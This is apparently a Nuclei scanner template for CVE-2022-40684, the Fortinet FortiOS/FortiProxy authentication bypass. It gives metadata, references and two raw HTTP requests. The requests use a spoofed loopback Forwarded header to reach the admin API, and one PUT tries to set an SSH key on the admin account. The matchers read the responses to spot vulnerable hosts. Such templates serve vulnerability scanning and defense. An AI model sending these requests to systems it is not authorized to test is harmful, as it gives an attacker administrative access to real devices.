id: CVE-2022-40684
info:
  name: Fortinet - Authentication Bypass
  author: Shockwave,nagli,carlosvieira
  severity: critical
  description: A vulnerability in Fortinet allows an attacker to bypass authentication
    and perform unauthorized operations, obtain sensitive information, and modify
    data.
  reference:
  - https://github.com/horizon3ai/CVE-2022-40684/blob/master/CVE-2022-40684.py
  - https://securityonline.info/researchers-have-developed-cve-2022-40684-poc-exploit-code/
  - https://socradar.io/what-do-you-need-to-know-about-fortinet-critical-authentication-bypass-vulnerability-cve-2022-40684/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40684
  - https://nvd.nist.gov/vuln/detail/CVE-2022-40684
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-40684
    cwe-id: CWE-306
  tags: cve,cve2022,fortinet,fortigate,fortios,fortiproxy,auth-bypass,kev
  metadata:
    impact: The impact of CVE-2022-40684 Fortinet Authentication Bypass vulnerability
      is the ability for an attacker to obtain sensitive information, modify data,
      and/or execute unauthorized operations on the administrative interface, compromising
      the security of the system.
    recommendation: It is recommended to upgrade to the latest version of FortiOS,
      FortiProxy, and FortiSwitchManager to address the CVE-2022-40684 authentication
      bypass vulnerability.
requests:
- raw:
  - 'GET /api/v2/cmdb/system/admin HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Node.js

    Forwarded: by="[127.0.0.1]:1337";for="[127.0.0.1]:1337";proto=http;host=

    X-Forwarded-Vdom: root

    '
  - "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Report Runner\nContent-Type: application/json\nForwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;\n\
    Content-Length: 610\n\n {\n  \"ssh-public-key1\":\"{{randstr}}\"\n}\n"
  stop-at-first-match: true
  req-condition: true
  matchers-condition: or
  matchers:
  - type: word
    part: body_1
    words:
    - ENC XXXX
    - http_method
    condition: and
  - type: word
    part: body_2
    words:
    - Invalid SSH public key.
    - cli_error
    condition: and
